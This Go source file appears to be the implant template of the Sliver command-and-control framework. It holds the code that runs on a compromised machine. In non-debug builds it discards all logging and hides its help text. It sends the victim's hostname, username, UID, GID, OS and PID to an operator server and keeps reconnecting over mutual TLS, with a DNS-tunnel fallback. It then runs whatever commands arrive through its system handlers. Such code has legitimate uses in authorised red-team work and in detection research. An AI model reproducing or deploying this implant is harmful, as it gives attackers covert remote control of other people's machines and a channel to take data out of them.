package main

import (
	"crypto/x509"
	"flag"
	"io"
	"os"
	"os/user"
	"runtime"

	// {{if .Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	"log"
	"strconv"
	"time"

	pb "sliver/protobuf/sliver"
	"sliver/sliver/limits"

	"github.com/golang/protobuf/proto"
)

var (
	sliverName = `{{.Name}}`
	keyPEM     = `{{.Key}}`
	certPEM    = `{{.Cert}}`
	caCertPEM  = `{{.CACert}}`

	// {{if .MTLSServer}}
	mtlsServer = `{{.MTLSServer}}`
	// {{end}}

	// {{if .DNSParent}}
	dnsParent = `{{.DNSParent}}`
	// {{end}}

	readBufSize = 64 * 1024 // 64kb

	maxErrors = 100 // TODO: Make configurable

	mtlsLPort         = getDefaultMTLSLPort()
	reconnectInterval = getReconnectInterval()
)

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	flag.Usage = func() {} // No help!
	flag.Parse()

	// {{if .Debug}}
	log.Printf("Hello my name is %s", sliverName)
	// {{end}}

	limits.ExecLimits()

	startConnectionLoop()
}

func startConnectionLoop() {
	// {{if .Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}
	connectionAttempts := 0
	for connectionAttempts < maxErrors {
		err := mtlsConnect()
		if err != nil {
			// {{if .Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
		}
		connectionAttempts++

		// {{if .DNSParent}}
		if dnsParent != "" {
			err = dnsConnect()
			if err != nil {
				// {{if .Debug}}
				log.Printf("[dns] Connection failed %s", err)
				// {{end}}
			}
			connectionAttempts++
		} else {
			// {{if .Debug}}
			log.Printf("No DNS parent domain configured\n")
			// {{end}}
		}
		// {{end}} - DNSParent

		time.Sleep(reconnectInterval)
	}
	// {{if .Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}
}

// {{if .MTLSServer}}
func mtlsConnect() error {
	// {{if .Debug}}
	log.Printf("Connecting -> %s:%d", mtlsServer, uint16(mtlsLPort))
	// {{end}}
	conn, err := tlsConnect(mtlsServer, uint16(mtlsLPort))
	if err != nil {
		return err
	}
	defer conn.Close()
	mtlsRegisterSliver(conn)

	send := make(chan *pb.Envelope)
	defer close(send)
	go func() {
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	handlers := getSystemHandlers()
	for {
		envelope, err := socketReadEnvelope(conn)
		if err == io.EOF {
			break
		}
		if err == nil {
			if handler, ok := handlers[envelope.Type]; ok {
				go handler(envelope.Data, func(data []byte, err error) {
					send <- &pb.Envelope{
						ID:   envelope.ID,
						Data: data,
					}
				})
			}
		}
	}
	return nil
}

// {{end}} -MTLSServer

// {{if .DNSParent}}
func dnsConnect() error {
	// {{if .Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, sessionKey, err := dnsStartSession(dnsParent)
	if err != nil {
		return err
	}
	// {{if .Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	pollCtrl := make(chan bool)
	defer func() {
		pollCtrl <- true // Stop polling
		close(send)
		close(recv)
		close(pollCtrl)
	}()

	go func() {
		for envelope := range send {
			go dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
		}
	}()

	go dnsRegisterSliver(send)

	go dnsSessionPoll(dnsParent, sessionID, sessionKey, pollCtrl, recv)

	handlers := getSystemHandlers()
	for envelope := range recv {
		if handler, ok := handlers[envelope.Type]; ok {
			go handler(envelope.Data, func(data []byte, err error) {
				send <- &pb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
		}
	}
	return nil
}

// {{end}} - DNSParent

func getDefaultMTLSLPort() int {
	lport, err := strconv.Atoi(`{{.MTLSLPort}}`)
	if err != nil {
		return 8888
	}
	return lport
}

func getReconnectInterval() time.Duration {
	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
	if err != nil {
		return 30 * time.Second
	}
	return time.Duration(reconnect) * time.Second
}

func getRegisterSliver() *pb.Envelope {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	data, _ := proto.Marshal(&pb.Register{
		Name:     sliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Pid:      int32(os.Getpid()),
		Filename: os.Args[0],
	})
	envelope := &pb.Envelope{
		Type: pb.MsgRegister,
		Data: data,
	}
	return envelope
}

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		// {{if .Debug}}
		log.Printf("Failed to parse root certificate")
		// {{end}}
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to parse certificate: " + err.Error())
		// {{end}}
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to verify certificate: " + err.Error())
		// {{end}}
		return err
	}

	return nil
}
